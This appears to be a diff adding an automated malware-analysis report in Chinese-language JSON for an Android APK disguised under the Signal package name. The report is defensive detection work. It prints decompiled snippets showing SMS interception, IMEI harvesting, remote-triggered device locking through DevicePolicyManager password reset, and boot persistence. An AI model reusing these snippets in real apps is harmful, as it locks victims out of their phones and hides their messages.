@@ -1,0 +1,179 @@
+{
+  "APK信息": {
+    "文件名": "fd6fd932c7426b309ee729fa9045c25c117b8ad2c6e94587fe0d28f70611f2ae.apk",
+    "sha256": "fd6fd932c7426b309ee729fa9045c25c117b8ad2c6e94587fe0d28f70611f2ae",
+    "包名": "org.thoughtcrime.securesms",
+    "应用名": "GKB SmsSecurity",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 366.6
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        },
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\thoughtcrime\\securesms\\by;",
+          "method_signature": "onReceive(Context context, Intent intent)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "abortBroadcast();",
+          "malicious_code_snippet_context": "  \n      @Override // android.content.BroadcastReceiver\n      public void onReceive(Context context, Intent intent) {\n>>>         abortBroadcast();\n      }\n  }",
+          "behavior_description": "在 BroadcastReceiver.onReceive 中直接调用 abortBroadcast() 中止广播，阻止短信被系统默认应用或其他应用接收，实现短信拦截。数据来源为接收到的短信广播 Intent，危险操作为 abortBroadcast() 中止广播传播。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "getDeviceId",
+          "getSubscriberId"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\thoughtcrime\\securesms\\h\\i;",
+          "method_signature": "if(telephonyManager.getSimState()",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "if (telephonyManager.getSimState() != 5) {\n    return a(\"IMEI\", \"\", context) != \"\" ? a(\"IMEI\", \"\", context) : \"\";\n}\nString deviceId = telephonyManager.getDeviceId();\nb(\"IMEI\", deviceId, context);\nreturn deviceId;",
+          "malicious_code_snippet_context": "      }\n  \n      private static String a(TelephonyManager telephonyManager, Context context) {\n>>>         if (telephonyManager.getSimState() != 5) {\n>>>             return a(\"IMEI\", \"\", context) != \"\" ? a(\"IMEI\", \"\", context) : \"\";\n>>>         }\n>>>         String deviceId = telephonyManager.getDeviceId();\n>>>         b(\"IMEI\", deviceId, context);\n>>>         return deviceId;\n      }\n  \n      public static String a(String str, String str2, Context context) {",
+          "behavior_description": "代码通过TelephonyManager.getDeviceId()获取设备IMEI唯一标识符，并通过b()方法将其持久化存储到SharedPreferences中。当SIM卡未就绪(SIM_STATE!=5)时，从本地SharedPreferences缓存读取之前存储的IMEI。该类伪装在org.thoughtcrime.securesms（Signal客户端）包名下，实际进行设备指纹采集，IMEI作为设备唯一标识可用于追踪和识别用户。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "confirmed",
+      "子行为": [
+        {
+          "子行为": "device_lock",
+          "中文名": "设备锁屏",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "lockNow",
+              "resetPassword"
+            ]
+          }
+        },
+        {
+          "子行为": "file_encryption",
+          "中文名": "文件加密",
+          "置信度": "confirmed",
+          "证据": {
+            "方法引用": [
+              "Ljavax/crypto/Cipher;->doFinal",
+              "Ljavax/crypto/Cipher;->init"
+            ],
+            "权限": [],
+            "字符串": [
+              "AES"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\thoughtcrime\\securesms\\h\\f;",
+          "method_signature": "if(this.c != \"0\")",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "case LOCK:\n    if (this.c != \"0\") {\n        DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService(\"device_policy\");\n        devicePolicyManager.resetPassword(this.c, 1);\n        devicePolicyManager.lockNow();\n    }\n    return;\ncase UNLOCK:\n    DevicePolicyManager devicePolicyManager2 = (DevicePolicyManager) context.getSystemService(\"device_policy\");\n    devicePolicyManager2.resetPassword(\"\", 1);\n    devicePolicyManager2.lockNow();\n    return;",
+          "malicious_code_snippet_context": "                  i.m(context);\n                  i.b(\"PHONE_NUMBER\", \"\", context);\n                  return;\n>>>             case LOCK:\n>>>                 if (this.c != \"0\") {\n>>>                     DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService(\"device_policy\");\n>>>                     devicePolicyManager.resetPassword(this.c, 1);\n>>>                     devicePolicyManager.lockNow();\n>>>                     i.b(\"Device locked\", context);\n>>>                     return;\n>>>                 }\n>>>                 return;\n>>>             case UNLOCK:\n>>>                 DevicePolicyManager devicePolicyManager2 = (DevicePolicyManager) context.getSystemService(\"device_policy\");\n>>>                 devicePolicyManager2.resetPassword(\"\", 1);\n                  devicePolicyManager2.lockNow();\n                  i.b(\"Device unlocked\", context);\n                  return;",
+          "behavior_description": "该代码通过DevicePolicyManager实现设备锁屏勒索功能。在LOCK分支中，从远程指令获取的密码值(this.c)被用于调用resetPassword()重置设备锁屏密码，随后调用lockNow()立即锁定设备，使用户无法正常使用手机。在UNLOCK分支中，将密码重置为空并再次锁屏以恢复访问。该代码伪装在org.thoughtcrime.securesms（Signal应用）包名下，属于典型的勒索软件设备锁定行为。数据流向：远程指令传入密码(this.c) → DevicePolicyManager.resetPassword()重置锁屏密码 + lockNow()强制锁屏",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_reboot",
+      "中文名": "设备重启",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "reboot"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\thoughtcrime\\securesms\\xbroadcast\\OnBootReceiver;",
+          "method_signature": "if(i.h(context)",
+          "malicious_behavior": "device_reboot",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "public void onReceive(Context context, Intent intent) {\n    if (i.h(context).booleanValue()) {\n        return;\n    }\n    context.startService(new Intent(\"XMainProcessStart\").putExtra(\"name\", \"value\"));\n}",
+          "malicious_code_snippet_context": "  /* loaded from: classes.dex */\n  public class OnBootReceiver extends BroadcastReceiver {\n      @Override // android.content.BroadcastReceiver\n>>>     public void onReceive(Context context, Intent intent) {\n>>>         if (i.h(context).booleanValue()) {\n>>>             return;\n>>>         }\n>>>         i.c(\"REBOOT\", \"Device reboot fixed. Service started after reboot.\", context);\n>>>         context.startService(new Intent(\"XMainProcessStart\").putExtra(\"name\", \"value\"));\n      }\n  }",
+          "behavior_description": "OnBootReceiver 监听设备开机广播(BOOT_COMPLETED)，在设备重启后自动启动名为 'XMainProcessStart' 的服务。数据流向：开机广播事件(source) → startService 启动恶意主进程(sink)。该机制确保恶意服务在设备重启后自动恢复运行，实现持久化保活。代码伪装在 org.thoughtcrime.securesms（Signal 应用）包名下，具有明显的伪装意图。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
